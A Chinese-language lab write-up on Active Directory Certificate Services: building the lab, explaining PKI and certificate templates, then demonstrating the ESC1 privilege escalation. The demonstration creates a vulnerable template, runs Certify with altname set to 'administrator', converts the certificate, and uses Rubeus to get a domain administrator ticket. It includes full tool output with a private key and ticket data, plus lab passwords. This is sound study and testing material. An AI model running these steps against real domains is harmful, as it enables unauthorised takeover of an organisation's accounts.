0x00 前言
=======

生产环境中切记不能将证书服务安装在DC，强烈建议证书服务部署在单独的一台服务器

因为证书服务特性(不能更改计算机名称、网络参数)

我这里为了方便起见，直接部署在了DC上面

0x01 环境图
========

父域控 Windows Server 2016

```php
SUN\Administrator

Qaz123.
```

用户

```php
SUN\user1

Wsx123.
```

![image-20220507232150143](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-50dd55d0b6c741a5042ba1993c0f541397ebfc9b.png)

辅域控 Windows Server 2016

![image-20220507232225154](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0128553873c9d5b36eda9fb4cfdf4a3a91cce486.png)

父域用户 Win10

![image-20220507232118374](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-16fa19d1bd4e13ea70c3e3b231651945aeb0e490.png)

0x02 ADCS 环境搭建
==============

1、搭建一个域环境

2、搭建ADCS

点击添加角色和功能

![image-20220507160726703](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bd9060e448e962a330abb00653af29cb13f1326c.png)

![image-20220507160743827](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f10cd5a5053916c091e1bea05e255baa05bcaf5a.png)

![image-20220507160753833](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4aec87611158183e5311497de2941a27b4acfbdc.png)

勾选Active Directory 证书服务

![image-20220507160838283](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-31865272d1d88becbacc7e9c8b11db3068b05368.png)

![image-20220507160914690](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ccf8ada7c8f3ba5bb59d6628334d1648a97a6998.png)

![image-20220507160923279](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3f059bf33e4a4b58db1e2895db50c74fd4f7e56f.png)

勾选证书颁发机构、证书注册Web服务、证书颁发机构Web注册

![image-20220507160957366](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0616d0ef056757ed6e2d26aca558356104306d88.png)

![image-20220507161025531](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6cfff2d44b425bd54fd310a6971d019a3c439687.png)

![image-20220507161041179](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b88c4a3085bd80cf471e2aa5584f4cdddf27b865.png)

点击安装

![image-20220507161054638](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-83f5c445e876339c4dc4bce34027125ff8b29b0f.png)

![image-20220507162616684](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a4e6572f323814d64d57f4285d56824d5091987a.png)

进行配置

![image-20220507162716146](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-100ebdde3355201b772f388c11f8113f92f6a31c.png)

![image-20220507162735904](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-90480c3090c821a98a12affe83fce2008f63a6aa.png)

因为只有证书颁发机构，所以我们只配置这个服务即可

![image-20220507162827781](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b9babb507ca43b1d311abc853731b738bcc23daf.png)

![image-20220507162840694](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c97be3d6f116737b4bf33b0c709758548fcae69f.png)

![image-20220507162851189](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-190e8560d6f95fe6c215931b35a6090e18f0a9eb.png)

![image-20220507162909963](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-65b5f39e468ac9bf71b624f944dd2ef7fd44ec02.png)

![image-20220507162937181](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ecc1a7949d6b00807afd9b185c76ca77fd7ff2ca.png)

![image-20220507162950329](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-989176c23ffe7110ad47a142b08731e3dc75254e.png)

证书有效期默认：5年

![image-20220507163018467](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-15af52374f3477c9ec6987fcebe78161b9fb850c.png)

选择存储位置

![image-20220507163102575](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1a945e3caad708f736a6d35fb9027d89a19d7057.png)

![image-20220507163113287](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-308e0b1ad6d6e09e9b804e54f3eb64a50a0fc714.png)

配置成功

![image-20220507163136552](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bf8253804171bd4a83f6c8f53d9c6cc1e8e90728.png)

配置证书颁发机构Web注册

![image-20220507181428659](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ce54b9cee04bf0db3469704268dec21a6ef884cd.png)

![image-20220507181442808](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-629478f3c5cb8e1926d2ebc08398b5b5253f6606.png)

![image-20220507181500454](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-71c6217293cb26ffa99d074f836ac095a5c874b8.png)

打开控制面板--&gt;管理工具--&gt;证书颁发机构

![image-20220507163241354](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bd6d89f4518d3f99ca8b790b92ff7e529f88e309.png)

![image-20220507163313186](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-60c7cd407e0cab4349127f645c9f76fdec3a820d.png)

环境搭建完成

![image-20220507163831682](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-75d28731c0f02fefa0625aca38079beccc769e0e.png)

0x03 辅域搭建
=========

![image-20220507173241287](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1902706731803963934fb0ba964a1803351e700a.png)

![image-20220507173733247](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b254cedd9a56b52238a4a76bd982e86b18a91261.png)

![image-20220507173807832](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a0eec51b0d1421327e391a0fa93e3ea9fd08d6dd.png)

![image-20220507173823323](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e17b5ecc378ef483536a773884ceff00f1b0dbf6.png)

选择从父域复制

![image-20220507173855055](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6126f5c2deaf903ed0ff78734314550275da949b.png)

![image-20220507173939198](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-72e9bc301a57e8cb7a8cd52f4d6906abe4558774.png)

![image-20220507173946988](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7ba1664fd1065fef6e6152e0de22706bd4953de2.png)

![image-20220507174022399](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b7d0617880dfc225de574185bf723523d18ead05.png)

![image-20220507174121912](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d02c1990280ec1467520b577f4e73989651df73b.png)

0x04 证书服务
=========

首先介绍一下PKI公钥基础结构

在PKI(公钥基础结构)中，数字证书用于将公密钥对的公钥与其所有者的身份相关联

为了验证数字证书中公开的身份，所有者需要使用私钥来响应质询，只有他才能访问

![image-20220426173142900](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9d88c6a2e60513ec6373a641f048dff4ff4ddf35.png)

Microsoft提供了一个完全集成到Windows生态系统中的公钥基础结构(PKI)解决方案，用于公钥加密、身份管理、证书分发、证书撤销和证书管理。

启用后，会识别注册证书的用户，以便以后进行身份验证或撤销证书，即Active Directory Certificate Services(ADCS)

关键术语
----

1、根证书颁发机构 (Root Certification Authority)  
证书基于信任链，安装的第一个证书颁发机构将是根CA，它是我们信任链中的起始

2、从属CA(Subordinate CA)  
从属CA是信任链中的子节点，通常比根CA低一级。

3、颁发CA(Issuing CA)  
颁发CA属于从属CA，它向端点（例如用户、服务器和客户端）颁发证书，并非所有从属CA都需要颁发CA

4、独立CA(Standalone CA)  
通常定义是在未加入域的服务器上运行的CA

5、企业CA(Enterprise CA)  
通常定义是加入域并与Active Directory域服务集成的CA

6、电子证书(Digital Certificate)  
用户身份的电子证明，由Certificate Authority发放(通常遵循X.509标准)

7、AIA(Authority Information Access)  
权威信息访问(AIA)应用于CA颁发的证书，用于指向此证书颁发者所在的位置引导检查该证书的吊销情况

8、CDP(CRL Distribution Point)  
包含有关CRL位置的信息，例如URL (Web Server)或 LDAP路径(Active Directory)

9、CRL(Certificate Revocation List)  
CRL是已被撤销的证书列表，客户端使用CRL来验证提供的证书是否有效

ADCS服务架构
--------

ORCA1：首先使用本地管理员部署单机离线的根CA，配置AIA及CRL，导出根CA证书和CRL文件

由于根CA需要嵌入到所有验证证书的设备中，所以出于安全考虑，根CA通常与客户端之间做网络隔离或关机且不在域内，因为一旦根CA遭到管理员误操作或黑客攻击，需要替换所有嵌入设备中的根CA证书，成本极高

为了验证由根CA颁发的证书，需要使CRL验证可用于所有端点，为此将在从属CA(APP1)上安装一个Web服务器来托管验证内容。根CA机器使用频率很低，仅当需要进行添加另一个从属/颁发CA、更新CA或更改CRL

APP1：用于端点注册的从属CA，通常完成以下关键配置：

将根CA证书放入Active Directory的配置容器中，这样允许域客户端计算机自动信任根CA证书，不需要在组策略中分发该证书

在离线ORCA1上申请APP1的CA证书后，利用传输设备将根CA证书和CRL文件放入APP1的本地存储中，使APP1对根CA证书和根CA CRL的迅速直接信任。

部署Web Server以分发证书和CRL，设置CDP及AIA

LDAP属性
------

使用Active Directory Explorer

<https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer>

![image-20220515210817463](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a6a323c817958a8971bf50e6622b40ebbb80dd4d.png)

ADCS在LDAP容器中进行了相关属性定义：

```php
CN=Public Key Services,CN=Services,CN=Configuration,DC=sun,DC=com,192.168.40.101 [matrix.sun.com]
```

![image-20220515211106101](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0b50ef16f06a08dfbc15fdd470ad30aec6b43337.png)

Certificate templates
---------------------

ADCS 的大部分利用面集中在证书模板中，存储为：

```php
CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=sun,DC=com,192.168.40.101 [matrix.sun.com]
```

![image-20220515211641934](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9b9dc23dbd7a3ef6f5565d5d02401de48b7af6cb.png)

其objectClass为pKICertificateTemplate，以下为证书的字段：

- 常规设置：证书的有效期；
- 请求处理：证书的目的和导出私钥要求；
- 加密：要使用的加密服务提供程序 (CSP) 和最小密钥大小；
- Extensions：要包含在证书中的X509v3扩展列表；
- 主题名称：来自请求中用户提供的值，或来自请求证书的域主体身份；
- 发布要求：是否需要“CA证书管理员”批准才能通过证书申请；
- 安全描述符：证书模板的ACL，包括拥有注册模板所需的扩展权限。

证书模板颁发首先需要在CA的`certtmpl.msc`进行模板配置，随后在`certsrv.msc`进行证书模板的发布

在Extensions中证书模板对象的EKU(pKIExtendedKeyUsage)属性包含一个数组，其内容为模板中已启用的OID (Object Identifiers)。

![image-20220515211438774](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-dafd1eff9be058d1868ebf4b9956da56e4add2be.png)

![image-20220515211506999](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a68d456eaff57884fd29628205f263fb702edcb6.png)

![image-20220515211302566](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-212e7557f4680f226018045b0d7f5984b3d181ae.png)

![image-20220515211356262](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-92b5eb7fbd826d2172d4c2314c248e3bfe28da89.png)

这些自定义应用程序策略(EKU oid)会影响证书的用途，以下 oid的添加才可以让证书用于Kerberos身份认证

| 描述 | OID |
|---|---|
| Client Authentication | 1.3.6.1.5.5.7.3.2 |
| PKINIT Client Authentication | 1.3.6.1.5.2.3.4 |
| Smart Card Logon | 1.3.6.1.4.1.311.20.2.2 |
| Any Purpose | 2.5.29.37.0 |
| SubCA | (no EKUs) |

Enterprise NTAuth store
-----------------------

NtAuthCertificates包含所有CA的证书列表，不在内的CA无法处理用户身份验证证书的申请

向NTAuth发布/添加证书：

```php
certutil.exe –dspublish –f IssuingCaFileName.cer NTAuthCA
```

要查看NTAuth中的所有证书：

```php
certutil.exe –viewstore –enterprise NTAuth
```

要删除 NTAuth中的证书：

```php
certutil.exe -viewstore -enterprise NTAuth
```

![image-20220515212042472](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-95a45ffa303fa87f8d8b838ba6c3b368bf4a859d.png)

域内机器在注册表中有一份缓存：

```php
HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\NTAuth\Certificates
```

当组策略开启`自动注册证书`，等组策略更新时才会更新本地缓存

Certification Authorities &amp; AIA
-----------------------------------

Certification Authorities容器对应根CA的证书存储。当有新的颁发CA安装时，它的证书则会自动放到AIA容器中

```php
CN=sun-MATRIX-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=sun,DC=com,192.168.40.101 [matrix.sun.com]
```

![image-20220515212259725](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a0b39235059413ae37c06353ee0f72b293d6d2fe.png)

来自他们容器的所有证书同样会作为组策略处理的一部分传播到每个网络连通的客户端

当同步出现问题的话，KDC认证会抛`KDC_ERR_PADATA_TYPE_NOSUPP`报错

Certificate Revocation List
---------------------------

证书吊销列表(CRL)是由颁发相应证书的CA发布的已吊销证书列表，将证书与CRL进行比较是确定证书是否有效的一种方法

```php
CN=<CA name>,CN=<ADCS server>,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=
```

通常证书由序列号标识，CRL除了吊销证书的序列号之外，还包含每个证书的吊销日期，有效吊销日期和吊销原因

![image-20220515212421893](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-68293417ecf04455b575f323f4d743d0b3dd5cf7.png)

0x05 PKI
========

PKI 是一个术语，有些地方会采用中文的表述——公钥基本结构，用来实现证书的产生、管理、存储、分发和撤销等功能。我们可以把他理解成是一套解决方案，这套解决方案里面需要有证书颁发机构，有证书发布，证书撤掉等功能。

0x06 证书注册过程
===========

要从 AD CS 获取证书，客户端需要经过⼀个称为注册的过程

1、客户端首先根据Enrollment Services 容器中的对象找到企业 CA，然后创建公钥/私钥对  
2、将公钥、证书主题和证书模板名称等其他详细信息 一起放在证书签名请求 (CSR) 消息中，并使用私钥签署，然后将 CSR 发送到企业 CA 服务器  
3、CA 首先判断用户是否允许进行证书申请(它会通过查找 CSR 中指定的证书模板 AD 对象来确定是否会颁发证书)，证书模板是否存在以及判断请求内容是否符合证书模板  
4、通过审核后，CA 将使用证书模板定义的设置(例如，EKU、加密设置和颁发要求等)并使用 CSR 中提供的其他信息（如果证书的模板设置允许）生成含有客户端公钥的证书，并使用自己的私钥来签署  
5、签署完的证书可以进行查看并使用

![](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6c5ec083311661bf42591d7977fe2269d9ee7cb8.png)

0x07 ADCS漏洞--ESC1
=================

创建普通域用户

```php
net user /add user1 Wsx123. /domain
```

查看域用户

```php
net users /domain
```

![image-20220508010653269](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fc5ee620683097064067ac3578ec6bb59485d564.png)

赋予这个普通域账户一定权限

把这个普通域账户加到以下任意一个组即可

```php
Account Operators

Administrators

Backup Operators

Print Operators

Server Operators
```

```php
net localgroup "Account Operators" /add user1
```

前言
--

在ADCS中，错误配置会导致普通域用户到域管理员的提权。主要体现在证书模板这里，在证书模板中，我们可以设置应用程序的策略

错误配置
----

1、我们需要有权限去获取证书  
2、能够登记为客户端身份验证或智能卡登录等  
3、CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT开启

环境配置
----

打开控制面板--&gt;管理工具--&gt;证书颁发机构

![image-20220508004142372](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-adb4b6e9971e7adde38092241d985a58f7d2f293.png)

![image-20220508004230953](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5b2d6fd114196ebff708e0179588cb54b68fa4dd.png)

点击证书模板，右键选择管理

![image-20220508004337241](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-13e025940b6664467747e6e97da91ecf5becc06f.png)

![image-20220508004356943](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-689fa6acab7f5fe3f4cfeae77514db9ad8034138.png)

使用certtmpl.msc创建

右键复制工作站身份认证模板，做一些修改

![image-20220508004449093](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9757650c831705e9dbcaa4527f33ddf48dbd46e5.png)

1、在常规--&gt;修改模板显示名称为`MATRIX`

![image-20220508004524261](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3c7211a0595a3ebb8163275d7074d84df5158970.png)

2、扩展--&gt;的应用程序策略--&gt;加入客户端身份认证

![image-20220508004549409](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2cd8b61b0bc96b5b711a20217457ecf13238e530.png)

3、在安全中加入Domain Users具有注册权限

点击添加，选择高级

![image-20220508030053848](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a2df0f7f0553e50032da4701e1e44b3f83da71f7.png)

![image-20220508030017682](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a930d12aed59bc37eb71a8e67234f9c313b364e6.png)

![image-20220508030200842](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c511e1570e9a94d26fa0dff00b014fbdb558c445.png)

在使用者名称中，选择在请求中提供，也就是开启CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT

![image-20220508004919320](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-83d07bcad97b87a7d97cf27a324435c909244468.png)

最后进行应用，确定

![image-20220508005154340](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c0a9dbaf0a11040da7210e493e7ac530eccd4123.png)

使用Certsrv.msc，发布我们创建的危害模板

右键新建--&gt;要颁发的证书模板(T)

![image-20220508005254270](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-42e128afac4e20643d9fe5da3017ae6a3a9f3161.png)

检测
--

使用Certify检测有没有证书配置错误

<https://github.com/GhostPack/Certify>

```php
Certify.exe find /vulnerable
```

![image-20220508031025517](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-81ab68ced4dc650788b5d3f4b612d4965492ba47.png)

![image-20220508031123418](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a1fc1e659a8788794eea74746c91b7194d376d6d.png)

注意
--

Certify.exe工具有1个DLL依赖，需要复制到同目录下

![image-20220508032643411](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a51eddfc47745ecfe79350e7dd224c5e5dfab649.png)

在普通域用户下，获取证书，注意altname参数，这个需要填的是域管用户名。

```php
C:\Users\user1\Desktop\test>Certify.exe request /ca:matrix.sun.com\sun-Matrix-CA /template:MATRIX /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : SUN\user1
[*] No subject name specified, using current context as subject.

[*] Template                : MATRIX
[*] Subject                 : CN=user1, CN=Users, DC=sun, DC=com
[*] AltName                 : administrator

[*] Certificate Authority   : matrix.sun.com\sun-Matrix-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 6

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAmnJz1yLgZuP7Xkxc9vki8CQRr4FZQZdQqjzeiTaBPYiwyQ+D
PFqyI3tz5gu8F7eI50snhPoZXkgREssW9vsYL+Rq1XXcS/rHuInDo56OO4mcGDcp
Yu2udpqtteUrgbvc/VARR/Jr61GULMxFyfubk332xLpnqKRTXrHvGO7eJXQ6Cspr
/2vWz2mBIqDVM7QIqNUtAUmW9fSpRinPh67OHhCq+/43KwsH5Ea6Pq5j62ho7v0X
aviK1cr8yzG4jHezWU2kvHIfDr1tjVE5pozWLi9s7O/8ldEx+ob6Xi2Z9JNAcIys
6sVnpJ0p6aedHsJO4olKBNzlzFMnUSQO8H5lVwIDAQABAoIBAAR8YYf0n97tLT5i
amrT9qNR8N+PmreQfQvMw8vpdNyELVpRpIaqvbTRH58lZRutPYE2ShoPJ5B4+GH6
2xpmVaACeuXjS/g6+vUNr0x/zPLGvu1nIMEaVTBlsrjvRJG6kqMa4b2cuWy2zF52
umow8CZbCMFTBrK7vx4nfeHUAkjFKV7FLgJPqj7ou+FiLK98UCBWyAFkyOn9ejGI
MG5HALOTPeZsU5C0eVf9gNrPHM0o8RPix9fji0EBWRycBkSghAPhsaQt3/h1z7s0
FJ2pDiperJerRz5qb8BmTdSseAYizTlxhLYx0cxb6WvCqWwv2SR4Npr0rYWRnKmJ
F83QqCUCgYEA0kpVaoTFakp1z31TNt19dd8U40xHz+BleGjrJb+d4PW6HVTx7+2L
XelaL0moH66DGAhm90ttbhDxTwgx8cmA/T227TuW1kLb2nQTtW3BrMz8CLdGkrMc
Qx+J2HMCP2kI4IJmhnUd8Ifo6DRI1ca/UgZ5V0HnhQk6BFmrAVF2Yd0CgYEAvAS0
HGDOBfYgkwidso5LmxshJBgE5ZOF4u0ykG9P7/irWh77VY8g17YWDbStBKe289uC
l/9ZMp3m6QKG4x5PluuMSnMi8mjKwMFxuPn206coGXRrFvJq8Qd/SXYfoGXoMxzI
ughgqGDcogv4VzNCfVI6+YfP/jc2J7ih0zK0osMCgYAN1TPvMNKnnkRHpM/PgRxa
n5UJKqBirTkfhY9KSWOCQ8e9XDQZ+z86qznyeF7lzp3y+8KCK+UD43tsHnbil8Wz
YtbgnhXa/EToBtCxE4o06rr9e8jZp4yJYc64fUA9mZQq6IkD+TpB8z6/34iW/17g
b2qV8dDf8G5vkNJt4MTvxQKBgQCSmyBOGHXNVDPmMou0lRwDH85htJDs6nE1lzsc
QI+WUNJb/ViBSI+VZBgiK8XVoWkZEQrttmA5BcLt4diH9DSfO6Ay1UBkwK2IS85/
K/n445hy8MIoLHKS6wOnpoHWsl+yqzkhRjMIWC7x9F96ry+jRKFTvUDDuw1xP5h/
dERBvQKBgGNYcYZ6VQyxT8l1E3I4s9zEG7TIn7XK0Sb3kcSjB14/3KK/kWe2F0zK
cHeDTPCm+SA300w18gRUUBMpS0dTNC54vMM2/50Bui8K4sPenEZIeImtatyRB3EW
aotd5SQ/ha7g1TG4MyWXy3pZyeqWkTv4tb2kLRMtiUB3WUCNIWcS
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFkjCCBHqgAwIBAgITZAAAAAa/vGRwJ/OKnwAAAAAABjANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDY29tMRMwEQYKCZImiZPyLGQBGRYDc3VuMRYw
FAYDVQQDEw1zdW4tTUFUUklYLUNBMB4XDTIyMDUwNzE5NDcxMVoXDTIzMDUwNzE5
NDcxMVowSjETMBEGCgmSJomT8ixkARkWA2NvbTETMBEGCgmSJomT8ixkARkWA3N1
bjEOMAwGA1UEAxMFVXNlcnMxDjAMBgNVBAMTBXVzZXIxMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEAmnJz1yLgZuP7Xkxc9vki8CQRr4FZQZdQqjzeiTaB
PYiwyQ+DPFqyI3tz5gu8F7eI50snhPoZXkgREssW9vsYL+Rq1XXcS/rHuInDo56O
O4mcGDcpYu2udpqtteUrgbvc/VARR/Jr61GULMxFyfubk332xLpnqKRTXrHvGO7e
JXQ6Cspr/2vWz2mBIqDVM7QIqNUtAUmW9fSpRinPh67OHhCq+/43KwsH5Ea6Pq5j
62ho7v0XaviK1cr8yzG4jHezWU2kvHIfDr1tjVE5pozWLi9s7O/8ldEx+ob6Xi2Z
9JNAcIys6sVnpJ0p6aedHsJO4olKBNzlzFMnUSQO8H5lVwIDAQABo4ICdzCCAnMw
PgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIgs3id4HS0W6HnYMhgeyBP4bh0jOB
E4LRq3aB2qkQAgFkAgEEMBMGA1UdJQQMMAoGCCsGAQUFBwMCMA4GA1UdDwEB/wQE
AwIFoDAbBgkrBgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBRvaaTB
8gvAN6Sa18yQ3Fpl67xExjAoBgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNYWRt
aW5pc3RyYXRvcjAfBgNVHSMEGDAWgBRN/G56QCM1UH7CRYYHNaX6PhaIITCBxgYD
VR0fBIG+MIG7MIG4oIG1oIGyhoGvbGRhcDovLy9DTj1zdW4tTUFUUklYLUNBLENO
PW1hdHJpeCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zdW4sREM9Y29tP2NlcnRpZmljYXRl
UmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q
b2ludDCBuwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9D
Tj1zdW4tTUFUUklYLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXN1bixEQz1jb20/Y0FD
ZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3Jp
dHkwDQYJKoZIhvcNAQELBQADggEBAHMTY+N1tykT8h6y/X8/h7a3BgfZ/TNQueli
Dt6AfBbkRt/sohWjnX5wvrFJVnQkcxelUS4QqXGUw3ALpH+oVrXle05RA2Mc5qlL
xqLgiu7hT8CtX1w1kBvDZpGNLPURw7woNuNYc5Jo2wpAqN2j6OyC9jFg2zqklyNI
GG1CaqJRFW4wNsNI6+PCRXgiqy3BuCKtCAWyWupxB4VHIDNLAnA2q8Z/fwqrTvLp
kc4XUd5PQEA1m1JOhHNth4onBqKnPu1v2NPXj5bF5qsv8MLTTVSdsI4KXvyzV5RI
kXSvwcTwdkCW8NuxXj4c2b+s7i9Ko+VF8VuAC5gkyCs+8WH/JMM=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:15.4993945
```

![image-20220508035932839](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4f928a8070236bd55a038f405e0c27201150bcbd.png)

![image-20220508040034743](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4c78a8de21affbee1ee3c88717d615d00a663d11.png)

将`-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----`复制保存为`cert.pem`

算换pem到pfx，不要输入密码

```objectivec
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![image-20220508040223756](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b8f811fd7ee7e27b1dc6fe7a0cc2c60ed4fdb9ad.png)

使用Rubeus获取TGT

```php
C:\Users\user1\Desktop\test>Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /dc:192.168.40.101 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=user1, CN=Users, DC=sun, DC=com
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sun.com\administrator'
[*] Using domain controller: 192.168.40.101:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpjCCBaKgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoQkbB1NVTi5DT02iHDAaoAMCAQKh
      EzARGwZrcmJ0Z3QbB3N1bi5jb22jggSHMIIEg6ADAgESoQMCAQKiggR1BIIEcUi+EUdQG0gcdIpJUaPg
      S2F/YKSRd5pHPjtigFbP9lD1c6ZbNS1C0jzul0qnHhmENbQJXzkQ+T8zdB+WNScpRHGYUnGFVH4AShuC
      0iI8tInQKtAe7wYy8tsgfueNBkc+NemUHJZfNLzEqmnOmb2RqQIQdk6PaYjXk2dHl6+zzu42HQcVJHJA
      w+1Ol0D7QmMu5r4HsxH32Pq6VczFkLZTDx//FfTT/+2VCkPyrg8fn1VsW7qXep98fjRF00ua97gJp28w
      zwflmhALnUMu7CiAmkVDOWA17ROkRIAXn2dtE/daTkcRIuCoVd2vVdH9UOHr5LOo6DZ8UR07NShyr6hO
      QbOIhUOdid8GMM8zyzjEdLZLHhNmpDWId+bz+zISJDx/Xi7v4+ZzGa1pQHsgBfLrvBdZrr7joiucLdxO
      nzYI3niOrHypFliQ8OwgQhijtDgimTG+6U35z3goK+ahlR+Evx8p8BN3KoT12gPknT+nk6Nbt1n0eEM0
      4sr9zylqI9Py128lrZzL50mOwGh8o+TZEklje0Jk+7FJ+TuIx+LDWvk00MELpX/2Rs5wsgZADnlsmPKw
      n97/ojJeoKuI4mqDN2kggtU3Enurl5+XJBegr3U7bZvu9ukIdgqh/rHcX1Qrl9KKxMXcz/XI2KkD4OGn
      kwMn1rsx7ptW8xAH4GgzDohMYuOxaIZvHqxwE704fP4XFhMiXohHpBLE+yMpgPl09qUoLhsTEUgmEUu4
      YhLuwHyTOZIB0hd7CjvV00N6f2BlxCcHR5p3f9oeJa+54ZgzFsqah6pAT2rH/xvG6wexny7BzkENnTLE
      dzLpoJkXl1C/lpLSMmmgiX8gNUDowk1ULHN4zamIbTIisx1m3Xvu08vkVcrDda+1gqgBi5r7eLEQhxF0
      dMjBSnrZHmolDncuj44pSElqH5UUX6C00nDRYvFgAPfFtzaH+W1BoJRbSR96S8sVTTXrHQyjFIV/GgFP
      EL15GXS4rrt1IWeVJ8Ot0JrIHEk65i3LpSBZmHAqafGTOgug1CDj4fX/WhdgtpilCGSAo0AXeYpOS5n+
